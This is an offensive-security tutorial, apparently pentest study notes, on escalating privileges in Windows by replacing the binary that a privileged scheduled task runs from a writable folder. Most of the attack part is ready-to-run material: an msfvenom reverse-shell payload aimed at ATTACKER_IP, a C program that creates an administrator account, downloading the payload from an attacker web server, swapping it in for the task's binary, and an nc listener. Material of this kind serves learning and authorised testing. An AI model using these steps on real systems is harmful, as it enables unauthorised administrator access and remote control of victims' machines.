**Scheduled Tasks** are used by Windows to automate execution of programs or scripts based on defined triggers. These tasks can run at specific times, during system startup, or when certain events occur.

From an offensive perspective, they become interesting when:

- They execute with elevated privileges (Administrator or SYSTEM)
    
- They reference files located in writable directories
    

If an attacker can modify the binary or script executed by a scheduled task, they can achieve code execution in the context of the task’s configured user.

---

## Task Execution Model and Attack Surface

Each scheduled task is defined by three critical elements:

- **Principal (Run As User)** → defines privilege level
    
- **Trigger** → determines when execution happens
    
- **Action** → specifies the executable or script
    

The attack focuses on the **Action**, since it defines what gets executed.

If the referenced file is:

- Writable by a low-privileged user
    
- Executed by a high-privileged account
    

Then replacing it leads to privilege escalation.

---

## Enumerating Scheduled Tasks

### Using schtasks

List all tasks with full details:

```powershell
schtasks /query /fo LIST /v
```

This produces verbose output. Focus on:

- `TaskName`
    
- `Task To Run`
    
- `Run As User`
    
- `Next Run Time`
    

Example:

```text
TaskName:        \Custom\BackupTask
Task To Run:     C:\Users\user\Scripts\backup.exe
Run As User:     Administrator
Next Run Time:   10:00:00 AM
```

This indicates a potential privilege escalation path if the file is writable.


### Using PowerShell

Alternative enumeration:

```powershell
Get-ScheduledTask | Select TaskName, TaskPath, State
```

To extract execution details:

```powershell
Get-ScheduledTask | ForEach-Object {
    $_.Actions
}
```

---

## Identifying Exploitable Conditions

### Checking Execution Context

The task must run as a privileged user:

```text
Run As User: SYSTEM
Run As User: Administrator
```

If it runs as the current user, it is not useful for escalation.


### Checking File Permissions

Verify write access to the executed binary:

```powershell
icacls "C:\Users\user\Scripts\backup.exe"
```

Vulnerable example:

```text
BUILTIN\Users:(F)
BUILTIN\Users:(M)
```

This allows:

- File replacement
    
- Full overwrite
    

### Evaluating Trigger Frequency

The trigger determines how practical the attack is:

- Frequent execution (e.g., every minute) → ideal
    
- One-time or past execution → not useful
    
- Startup/logon → may require reboot or user interaction
    

---

## Crafting the Payload

A simple executable can be used to escalate privileges.

Using msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o payload.exe
```

Or a custom binary:

```c
#include <stdlib.h>

int main() {
    system("net user attacker Pass123! /add");
    system("net localgroup administrators attacker /add");
    return 0;
}
```

Compile:

```bash
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
```

---

## Replacing the Target Binary

Transfer the payload:

```bash
python3 -m http.server 8080
```

```powershell
iwr -uri http://ATTACKER_IP:8080/payload.exe -OutFile payload.exe
```

Backup the original file:

```powershell
move "C:\Users\user\Scripts\backup.exe" "backup.exe.bak"
```

Replace it:

```powershell
move .\payload.exe "C:\Users\user\Scripts\backup.exe"
```

The filename must match exactly.

---

## Triggering Execution

If the task runs frequently, simply wait for execution.

Otherwise, attempt manual execution:

```powershell
schtasks /run /tn "\Custom\BackupTask"
```

Execution depends on permissions. If not allowed, rely on the scheduled trigger.

---

## Verifying Privilege Escalation

Check if the payload executed successfully:

```powershell
net user
```

```powershell
net localgroup administrators
```

Or listen for a reverse shell:

```bash
nc -lvnp 4444
```

The resulting access level matches the task’s configured user.
